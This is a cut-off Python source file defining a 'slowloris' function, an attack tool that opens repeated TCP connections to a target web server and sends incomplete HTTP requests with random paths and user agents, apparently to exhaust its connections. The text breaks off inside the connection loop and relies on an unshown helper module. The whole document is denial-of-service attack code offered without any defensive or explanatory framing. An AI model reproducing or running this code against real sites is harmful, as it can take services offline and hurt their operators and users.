import socket
import time
import func
def slowloris(site, port, threads, timeout):
    try:
        time.sleep(1)
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((site, int(port)))
        s.send("GET /?{} HTTP/1.1\r\n".format(func.random_str(6)).encode())
        s.send("User-Agent: {}\r\n".format(func.random_ua()).encode())
        s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode())
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((site, int(port)))
                s.send("{}\r\n".format("GET /?{} HTTP/1.1").format(func.random_str(6)).encode())

